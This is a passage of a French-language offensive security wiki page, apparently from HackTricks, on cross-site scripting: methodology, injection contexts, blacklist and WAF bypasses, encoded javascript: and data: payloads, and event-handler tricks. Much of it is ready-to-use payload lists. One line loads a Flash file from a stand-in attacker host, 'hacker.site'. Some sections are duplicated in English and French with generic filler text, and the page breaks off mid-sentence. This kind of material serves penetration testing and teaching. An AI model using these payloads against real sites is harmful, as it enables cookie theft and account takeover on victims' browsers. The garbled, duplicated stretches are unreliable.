# XSS (Cross Site Scripting)

/<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">

**Astuce de prime de bug**: **inscrivez-vous** à **Intigriti**, une plateforme premium de prime de bug créée par des hackers, pour les hackers ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) dès aujourd'hui et commencez à gagner des primes allant jusqu'à **100 000 $** !

{% embed url="https://go.intigriti.com/hacktricks" %}

## Méthodologie

1. Vérifiez si **une valeur que vous contrôlez** (paramètres, chemin, en-têtes ?, cookies ?) est **réfléchie** dans le HTML ou **utilisée** par du code **JS**.
2. **Trouvez le contexte** où elle est réfléchie/utilisée.
3. Si elle est **réfléchie**
1. Vérifiez **quels symboles vous pouvez utiliser** et en fonction de cela, préparez la charge utile :
1. Dans du **HTML brut** :
1. Pouvez-vous créer de nouvelles balises HTML ?
2. Pouvez-vous utiliser des événements ou des attributs prenant en charge le protocole `javascript:` ?
3. Pouvez-vous contourner les protections ?
4. Le contenu HTML est-il interprété par un moteur JS côté client (AngularJS, VueJS, Mavo...), vous pourriez exploiter une [**Injection de modèle côté client**](../client-side-template-injection-csti.md).
5. Si vous ne pouvez pas créer de balises HTML qui exécutent du code JS, pourriez-vous exploiter une [**Injection de balisage en suspens - Injection HTML sans script**](../dangling-markup-html-scriptless-injection.md) ?
2. À l'intérieur d'une **balise HTML** :
1. Pouvez-vous sortir du contexte HTML brut ?
2. Pouvez-vous créer de nouveaux événements/attributs pour exécuter du code JS ?
3. L'attribut dans lequel vous êtes piégé prend-il en charge l'exécution de JS ?
4. Pouvez-vous contourner les protections ?
3. À l'intérieur du code **JavaScript** :
1. Pouvez-vous échapper à la balise `<script>` ?
2. Pouvez-vous échapper à la chaîne et exécuter un code JS différent ?
3. Vos entrées sont-elles dans des littéraux de modèle \`\` ?
4. Pouvez-vous contourner les protections ?
4. Fonction JavaScript **exécutée**
1. Vous pouvez indiquer le nom de la fonction à exécuter. par exemple : `?callback=alert(1)`
4. Si elle est **utilisée** :
1. Vous pouvez exploiter un **DOM XSS**, faites attention à la façon dont votre entrée est contrôlée et si votre **entrée contrôlée est utilisée par une faille**.

Lorsque vous travaillez sur un XSS complexe, il peut être intéressant de connaître :

{% content-ref url="debugging-client-side-js.md" %}
[debugging-client-side-js.md](debugging-client-side-js.md)
{% endcontent-ref %}

## Valeurs réfléchies

Pour exploiter avec succès un XSS, la première chose que vous devez trouver est une **valeur contrôlée par vous qui est réfléchie** dans la page web.

* **Réfléchie de manière intermédiaire** : Si vous constatez que la valeur d'un paramètre ou même du chemin est réfléchie dans la page web, vous pourriez exploiter un **XSS réfléchi**.
* **Stockée et réfléchie** : Si vous constatez qu'une valeur contrôlée par vous est enregistrée sur le serveur et est réfléchie chaque fois que vous accédez à une page, vous pourriez exploiter un **XSS stocké**.
* **Accédée via JS** : Si vous constatez qu'une valeur contrôlée par vous est utilisée à l'aide de JS, vous pourriez exploiter un **DOM XSS**.

## Contextes

Lorsque vous essayez d'exploiter un XSS, la première chose que vous devez savoir est **où votre entrée est réfléchie**. Selon le contexte, vous pourrez exécuter du code JS arbitraire de différentes manières.

### HTML brut

Si votre entrée est **réfléchie sur la page HTML brute**, vous devrez abuser d'une **balise HTML** pour exécuter du code JS : `<img , <iframe , <svg , <script` ... ce ne sont que quelques-unes des nombreuses balises HTML possibles que vous pourriez utiliser.\
Gardez également à l'esprit l'[Injection de modèle côté client](../client-side-template-injection-csti.md).

### À l'intérieur de l'attribut des balises HTML

Si votre entrée est réfléchie à l'intérieur de la valeur de l'attribut d'une balise, vous pouvez essayer :

1. De **sortir de l'attribut et de la balise** (puis vous serez dans le HTML brut) et de créer une nouvelle balise HTML à abuser : `"><img [...]`
2. Si vous **pouvez sortir de l'attribut mais pas de la balise** (`>` est encodé ou supprimé), selon la balise, vous pouvez **créer un événement** qui exécute du code JS : `" autofocus onfocus=alert(1) x="`
3. Si vous **ne pouvez pas sortir de l'attribut** (`"` est encodé ou supprimé), alors selon **quel attribut** votre valeur est réfléchie et **si vous contrôlez toute la valeur ou seulement une partie**, vous pourrez l'exploiter. Par **exemple**, si vous contrôlez un événement comme `onclick=`, vous pourrez le faire exécuter du code arbitraire lorsqu'il est cliqué. Un autre **exemple** intéressant est l'attribut `href`, où vous pouvez utiliser le protocole `javascript:` pour exécuter du code arbitraire : **`href="javascript:alert(1)"`**
4. Si votre entrée est réfléchie à l'intérieur de balises "**non exploitables**", vous pouvez essayer le truc de **`accesskey`** pour exploiter la vulnérabilité (vous aurez besoin d'une sorte d'ingénierie sociale pour exploiter cela) : **`" accesskey="x" onclick="alert(1)" x="`**

### À l'intérieur du code JavaScript

Dans ce cas, votre entrée est réfléchie entre les balises **`<script> [...] </script>`** d'une page HTML, à l'intérieur d'un fichier `.js` ou à l'intérieur d'un attribut utilisant le protocole **`javascript:`** :

* Si elle est réfléchie entre les balises **`<script> [...] </script>`**, même si votre entrée est à l'intérieur de guillemets, vous pouvez essayer d'injecter `</script>` et de sortir de ce contexte. Cela fonctionne parce que le **navigateur analysera d'abord les balises HTML** puis le contenu, il ne remarquera donc pas que votre balise `</script>` injectée est à l'intérieur du code HTML.
* Si elle est réfléchie **à l'intérieur d'une chaîne JS** et que le dernier truc ne fonctionne pas, vous devrez **sortir** de la chaîne, **exécuter** votre code et **reconstruire** le code JS (s'il y a une erreur, il ne sera pas exécuté) :
* `'-alert(1)-'`
* `';-alert(1)//`
* `\';alert(1)//`
* Si elle est réfléchie à l'intérieur de littéraux de modèle, vous pouvez **intégrer des expressions JS** en utilisant la syntaxe `${ ... }` : `` var greetings = `Hello, ${alert(1)}` ``
* L'encodage **Unicode** fonctionne pour écrire du **code JavaScript valide** :
```javascript
\u{61}lert(1)
\u0061lert(1)
\u{0061}lert(1)
```
#### Levée de fonctions JavaScript

La levée de fonctions JavaScript fait référence à la possibilité de **déclarer des fonctions, des variables ou des classes après leur utilisation**.

Par conséquent, si vous avez des scénarios où vous pouvez **injecter du code JS après l'utilisation d'un objet non déclaré**, vous pouvez **corriger la syntaxe** en le déclarant (ainsi votre code s'exécute au lieu de générer une erreur) :
```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesn´t exist
// cannot be fixed if you can only inject after that code:
test.cookie('leo','INJECTION')
test['cookie','injection']
```
Pour plus d'informations sur le hoisting JavaScript, consultez: [https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios](https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios)

### Fonction JavaScript

Plusieurs pages web ont des points d'extrémité qui **acceptent en tant que paramètre le nom de la fonction à exécuter**. Un exemple courant que l'on peut trouver est quelque chose comme : `?callback=callbackFunc`.

Une bonne façon de savoir si quelque chose donné directement par l'utilisateur essaie d'être exécuté est de **modifier la valeur du paramètre** (par exemple, en la remplaçant par 'Vulnerable') et de chercher dans la console des erreurs comme :

![](<../../.gitbook/assets/image (651) (2).png>)

Dans le cas où c'est vulnérable, vous pourriez être en mesure de **déclencher une alerte** en envoyant simplement la valeur : **`?callback=alert(1)`**. Cependant, il est très courant que ces points d'extrémité **valident le contenu** pour n'autoriser que des lettres, des chiffres, des points et des traits de soulignement (**`[\w\._]`**).

Cependant, même avec cette limitation, il est toujours possible d'effectuer certaines actions. Cela est possible car vous pouvez utiliser ces caractères valides pour **accéder à n'importe quel élément dans le DOM** :

![](<../../.gitbook/assets/image (662).png>)

Quelques fonctions utiles pour cela :
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
Vous pouvez également essayer de **déclencher des fonctions Javascript** directement : `obj.sales.delOrders`.

Cependant, généralement les points d'extrémité exécutant la fonction indiquée sont des points d'extrémité sans beaucoup de DOM intéressant, **d'autres pages dans la même origine** auront un **DOM plus intéressant** pour effectuer davantage d'actions.

Par conséquent, afin de **exploiter cette vulnérabilité dans un DOM différent**, l'exploitation de la **Same Origin Method Execution (SOME)** a été développée :

{% content-ref url="some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](some-same-origin-method-execution.md)
{% endcontent-ref %}

### DOM

Il y a du **code JS** qui utilise de manière **non sécurisée** des **données contrôlées par un attaquant** comme `location.href`. Un attaquant pourrait exploiter cela pour exécuter du code JS arbitraire.

{% content-ref url="dom-xss.md" %}
[dom-xss.md](dom-xss.md)
{% endcontent-ref %}

### **Universal XSS**

Ce type de XSS peut être trouvé **partout**. Ils ne dépendent pas seulement de l'exploitation côté client d'une application web, mais de **n'importe quel** **contexte**. Ce type d'exécution de **JavaScript arbitraire** peut même être utilisé pour obtenir une **RCE**, **lire** des **fichiers arbitraires** sur les clients et les serveurs, et plus encore.\
Quelques **exemples** :

{% content-ref url="server-side-xss-dynamic-pdf.md" %}
[server-side-xss-dynamic-pdf.md](server-side-xss-dynamic-pdf.md)
{% endcontent-ref %}

{% content-ref url="../../network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps/" %}
[xss-to-rce-electron-desktop-apps](../../network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps/)
{% endcontent-ref %}

## Contournement du WAF en encodant une image

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](../../.gitbook/assets/eaubb2ex0aerank.jpg)

## Injection à l'intérieur du HTML brut

Lorsque votre entrée est réfléchie **à l'intérieur de la page HTML** ou que vous pouvez échapper et injecter du code HTML dans ce contexte, la **première** chose à faire est de vérifier si vous pouvez utiliser `<` pour créer de nouvelles balises : Essayez simplement de **réfléchir** ce **caractère** et vérifiez s'il est **encodé en HTML** ou **supprimé** ou s'il est **réfléchi sans modifications**. **Seulement dans le dernier cas, vous pourrez exploiter ce cas**.\
Pour ces cas, gardez également à l'esprit [**l'injection de modèle côté client**](../client-side-template-injection-csti.md)**.**\
_**Note : Un commentaire HTML peut être fermé en utilisant**** ****`-->`**** ****ou**** ****`--!>`**_

Dans ce cas, et si aucune liste noire/liste blanche n'est utilisée, vous pouvez utiliser des charges utiles telles que :
```javascript
<script>alert(1)</script>
<img src=x onerror=alert(1) />
<svg onload=alert('XSS')>
```
Mais, si une liste noire/blanche de balises/attributs est utilisée, vous devrez **forcer de manière brutale quelles balises** vous pouvez créer.\
Une fois que vous avez **localisé quelles balises sont autorisées**, vous devrez **forcer de manière brutale les attributs/événements** à l'intérieur des balises valides trouvées pour voir comment vous pouvez attaquer le contexte.

### Forcer de manière brutale les balises/événements

Allez sur [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) et cliquez sur _**Copier les balises dans le presse-papiers**_. Ensuite, envoyez-les toutes en utilisant Burp Intruder et vérifiez si certaines balises n'ont pas été détectées comme malveillantes par le pare-feu d'application web (WAF). Une fois que vous avez découvert quelles balises vous pouvez utiliser, vous pouvez **forcer de manière brutale tous les événements** en utilisant les balises valides (sur la même page web, cliquez sur _**Copier les événements dans le presse-papiers**_ et suivez la même procédure qu'auparavant).

### Balises personnalisées

Si vous n'avez trouvé aucune balise HTML valide, vous pouvez essayer de **créer une balise personnalisée** et exécuter du code JS avec l'attribut `onfocus`. Dans la requête XSS, vous devez terminer l'URL avec `#` pour que la page **se concentre sur cet objet** et **exécute** le code :
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Contournement de liste noire

Si une sorte de liste noire est utilisée, vous pouvez essayer de la contourner avec quelques astuces ridicules :
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### Contournement de la longueur (petits XSS)

{% hint style="info" %}
**Plus de petits XSS pour différents environnements** le payload [**peut être trouvé ici**](https://github.com/terjanq/Tiny-XSS-Payloads) et [**ici**](https://tinyxss.terjanq.me).
{% endhint %}
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``>
<script src=//aa.es>
<script src=//℡㏛.pw>
```
Le dernier utilise 2 caractères unicode qui se développent en 5 : telsr\
Vous pouvez trouver plus de ces caractères [ici](https://www.unicode.org/charts/normalization/).\
Pour vérifier dans quels caractères sont décomposés, consultez [ici](https://www.compart.com/en/unicode/U+2121).

### Cliquez XSS - Clickjacking

Si pour exploiter la vulnérabilité, vous avez besoin que l'utilisateur clique sur un lien ou un formulaire avec des données préremplies, vous pouvez essayer d'**abuser du Clickjacking** (si la page est vulnérable).

### Impossible - Balisage suspendu

Si vous pensez simplement qu'il est impossible de créer une balise HTML avec un attribut pour exécuter du code JS, vous devriez vérifier le **balisage suspendu** car vous pourriez exploiter la vulnérabilité sans exécuter de code JS.

## Injection à l'intérieur de la balise HTML

### À l'intérieur de la balise/échappement de la valeur de l'attribut

Si vous êtes à l'intérieur d'une balise HTML, la première chose que vous pouvez essayer est de vous échapper de la balise et d'utiliser certaines des techniques mentionnées dans la [section précédente](./#injecting-inside-raw-html) pour exécuter du code JS.\
Si vous ne pouvez pas vous échapper de la balise, vous pouvez créer de nouveaux attributs à l'intérieur de la balise pour essayer d'exécuter du code JS, par exemple en utilisant une charge utile comme (_notez que dans cet exemple, les guillemets doubles sont utilisés pour échapper de l'attribut, vous n'en aurez pas besoin si votre entrée est directement reflétée à l'intérieur de la balise_):
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**Événements de style**

Les événements de style sont une technique couramment utilisée dans les attaques de script entre sites (XSS) pour exécuter du code malveillant sur un site web. Cette technique exploite les vulnérabilités dans la façon dont le site web gère les entrées utilisateur et les affiche sur la page.

L'attaque XSS par événements de style consiste à injecter du code JavaScript dans les attributs de style d'un élément HTML. Lorsque le navigateur interprète le code, il exécute le script malveillant, ce qui peut entraîner des conséquences néfastes telles que le vol de données sensibles, la redirection vers des sites malveillants ou la modification du contenu de la page.

Pour se protéger contre les attaques XSS par événements de style, les développeurs doivent mettre en œuvre des mesures de sécurité telles que la validation et l'échappement des entrées utilisateur, l'utilisation de listes blanches pour les caractères autorisés, et l'utilisation de bibliothèques de sécurité telles que Content Security Policy (CSP) pour restreindre les sources de scripts autorisées.

Il est essentiel de comprendre les techniques d'attaque XSS par événements de style afin de pouvoir les détecter et les prévenir lors de l'évaluation de la sécurité d'un site web. Les tests de pénétration et les audits de sécurité réguliers sont recommandés pour identifier et corriger les vulnérabilités XSS potentielles.
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### Dans l'attribut

Même si vous **ne pouvez pas échapper à l'attribut** (`"` est encodé ou supprimé), selon **quel attribut** votre valeur est reflétée, **si vous contrôlez toute la valeur ou seulement une partie**, vous pourrez l'exploiter. Par **exemple**, si vous contrôlez un événement comme `onclick=`, vous pourrez exécuter du code arbitraire lorsqu'il est cliqué.\
Un autre **exemple** intéressant est l'attribut `href`, où vous pouvez utiliser le protocole `javascript:` pour exécuter du code arbitraire : **`href="javascript:alert(1)"`**

**Contourner l'événement en utilisant l'encodage HTML/l'encodage d'URL**

Les caractères **encodés en HTML** à l'intérieur de la valeur des attributs des balises HTML sont **décodés à l'exécution**. Par conséquent, quelque chose comme ce qui suit sera valide (la charge utile est en gras) : `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

Notez que **tout type d'encodage HTML est valide** :
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**Notez que l'encodage d'URL fonctionnera également :**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**Contourner l'événement interne en utilisant l'encodage Unicode**

---

### Description

This technique involves bypassing client-side input validation by using Unicode encoding to inject malicious code into a web application. By encoding the payload, it is possible to bypass filters that are looking for specific keywords or characters.

### Vulnerability

Cross-Site Scripting (XSS) vulnerabilities occur when user input is not properly sanitized and is directly included in the output of a web application. This allows an attacker to inject malicious code that will be executed by the victim's browser.

### Exploitation

1. Identify a vulnerable input field or parameter in the web application.
2. Craft a payload using Unicode encoding to bypass any input filters or sanitization mechanisms.
3. Inject the payload into the vulnerable input field or parameter.
4. Trigger the execution of the payload by submitting the form or interacting with the affected element.
5. The injected code will be executed by the victim's browser, allowing the attacker to perform various actions, such as stealing sensitive information or performing unauthorized actions on behalf of the victim.

### Prevention

To prevent this type of attack, it is important to implement proper input validation and output encoding. Input validation should be performed on both the client and server sides to ensure that user input is properly sanitized. Output encoding should be used when displaying user-generated content to prevent any potential script execution.

---

**Contourner l'événement interne en utilisant l'encodage Unicode**

---

### Description

Cette technique consiste à contourner la validation des entrées côté client en utilisant l'encodage Unicode pour injecter du code malveillant dans une application web. En encodant la charge utile, il est possible de contourner les filtres qui recherchent des mots-clés ou des caractères spécifiques.

### Vulnérabilité

Les vulnérabilités de type Cross-Site Scripting (XSS) se produisent lorsque les entrées utilisateur ne sont pas correctement désinfectées et sont directement incluses dans la sortie d'une application web. Cela permet à un attaquant d'injecter du code malveillant qui sera exécuté par le navigateur de la victime.

### Exploitation

1. Identifier un champ ou un paramètre d'entrée vulnérable dans l'application web.
2. Créer une charge utile en utilisant l'encodage Unicode pour contourner les filtres ou les mécanismes de désinfection des entrées.
3. Injecter la charge utile dans le champ ou le paramètre d'entrée vulnérable.
4. Déclencher l'exécution de la charge utile en soumettant le formulaire ou en interagissant avec l'élément affecté.
5. Le code injecté sera exécuté par le navigateur de la victime, permettant à l'attaquant d'effectuer diverses actions, telles que le vol d'informations sensibles ou l'exécution d'actions non autorisées au nom de la victime.

### Prévention

Pour prévenir ce type d'attaque, il est important de mettre en place une validation appropriée des entrées et un encodage de sortie. La validation des entrées doit être effectuée à la fois côté client et côté serveur pour garantir une désinfection correcte des entrées utilisateur. L'encodage de sortie doit être utilisé lors de l'affichage de contenu généré par l'utilisateur pour éviter toute exécution de script potentiel.
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### Protocoles spéciaux dans l'attribut

Vous pouvez utiliser les protocoles **`javascript:`** ou **`data:`** à certains endroits pour **exécuter du code JS arbitraire**. Certains nécessiteront une interaction de l'utilisateur, d'autres non.
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3aalert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**Endroits où vous pouvez injecter ces protocoles**

**En général**, le protocole `javascript:` peut être **utilisé dans n'importe quelle balise qui accepte l'attribut `href`** et dans **la plupart** des balises qui acceptent l'attribut `src` (mais pas `<img`).
```markup
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**Autres astuces d'obfuscation**

_**Dans ce cas, l'encodage HTML et l'astuce d'encodage Unicode de la section précédente sont également valables car vous êtes à l'intérieur d'un attribut.**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
De plus, il existe une autre **astuce intéressante** pour ces cas : **Même si votre entrée à l'intérieur de `javascript:...` est encodée en URL, elle sera décodée avant d'être exécutée.** Donc, si vous avez besoin de **vous échapper** de la **chaîne de caractères** en utilisant une **apostrophe**, et que vous constatez qu'elle est **encodée en URL**, rappelez-vous que **cela n'a pas d'importance**, elle sera **interprétée** comme une **apostrophe** lors de l'**exécution**.
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
Notez que si vous essayez d'utiliser à la fois `URLencode + HTMLencode` dans n'importe quel ordre pour encoder la **charge utile**, cela **ne fonctionnera pas**, mais vous pouvez **les mélanger à l'intérieur de la charge utile**.

**Utilisation de l'encodage hexadécimal et octal avec `javascript:`**

Vous pouvez utiliser l'encodage **hexadécimal** et **octal** à l'intérieur de l'attribut `src` de `iframe` (au moins) pour déclarer des **balises HTML à exécuter en JS**:
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Reverse tab nabbing

Reverse tab nabbing is a type of cross-site scripting (XSS) attack that targets users who have multiple tabs open in their web browser. The attack takes advantage of the trust users have in the websites they visit.

In a typical scenario, the attacker crafts a malicious website and tricks the user into opening it in a new tab while keeping another trusted website open in a different tab. The malicious website then uses JavaScript to change the content of the tab with the trusted website, making it appear as if the user is still interacting with the trusted website.

The goal of reverse tab nabbing is to deceive the user into entering sensitive information, such as login credentials or financial details, into the malicious website, thinking they are interacting with the trusted website. This information is then captured by the attacker and can be used for malicious purposes.

To protect against reverse tab nabbing, users should be cautious when opening new tabs and ensure they only visit trusted websites. Web developers should also implement security measures, such as input validation and output encoding, to prevent XSS attacks and protect their users from this type of attack.
```javascript
<a target="_blank" rel="opener"
```
Si vous pouvez injecter n'importe quelle URL dans une balise **`<a href=`** arbitraire qui contient les attributs **`target="_blank"`** et **`rel="opener"`**, vérifiez la **page suivante pour exploiter ce comportement**:

{% content-ref url="../reverse-tab-nabbing.md" %}
[reverse-tab-nabbing.md](../reverse-tab-nabbing.md)
{% endcontent-ref %}

### Contournement des gestionnaires d'événements

Tout d'abord, consultez cette page ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) pour des **gestionnaires d'événements** utiles commençant par "on".\
Si une liste noire vous empêche de créer ces gestionnaires d'événements, vous pouvez essayer les contournements suivants:
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### XSS dans les "balises non exploitables" (input caché, lien, canonique, méta)

À partir de [**ici**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags), il est maintenant possible d'abuser des inputs cachés avec :
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle=alert(1)>
```
Et dans les **balises meta** :
```html
<!-- Injection inside meta attribute-->
<meta name="apple-mobile-web-app-title" content=""Twitter popover id="newsletter" onbeforetoggle=alert(2) />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
À partir de [**ici**](https://portswigger.net/research/xss-in-hidden-input-fields) : Vous pouvez exécuter une **charge utile XSS à l'intérieur d'un attribut caché**, à condition de pouvoir **persuader** la **victime** d'appuyer sur la **combinaison de touches**. Sur Firefox Windows/Linux, la combinaison de touches est **ALT+SHIFT+X** et sur OS X, c'est **CTRL+ALT+X**. Vous pouvez spécifier une combinaison de touches différente en utilisant une autre touche dans l'attribut accesskey. Voici le vecteur :
```markup
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**La charge utile XSS ressemblera à ceci: `" accesskey="x" onclick="alert(1)" x="`**

### Contournements de liste noire

Plusieurs astuces utilisant différents encodages ont déjà été exposées dans cette section. Revenez en arrière pour apprendre où vous pouvez utiliser :

* **Encodage HTML (balises HTML)**
* **Encodage Unicode (peut être un code JS valide) :** `\u0061lert(1)`
* **Encodage URL**
* **Encodage hexadécimal et octal**
* **Encodage de données**

**Contournements pour les balises et attributs HTML**

Lisez les [contournements de liste noire de la section précédente](./#contournements-de-liste-noire).

**Contournements pour le code JavaScript**

Lisez les [contournements de liste noire JavaScript de la section suivante](./#techniques-de-contournement-de-liste-noire-javascript).

### CSS-Gadgets

Si vous trouvez une **XSS dans une toute petite partie** du site web qui nécessite une certaine interaction (peut-être un petit lien dans le pied de page avec un élément onmouseover), vous pouvez essayer de **modifier l'espace occupé par cet élément** pour maximiser les chances que le lien soit activé.

Par exemple, vous pourriez ajouter un style à l'élément comme ceci : `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

Mais si le pare-feu d'application web (WAF) filtre l'attribut style, vous pouvez utiliser des gadgets de style CSS. Ainsi, si vous trouvez, par exemple :

> .test {display:block; color: blue; width: 100%\}

et

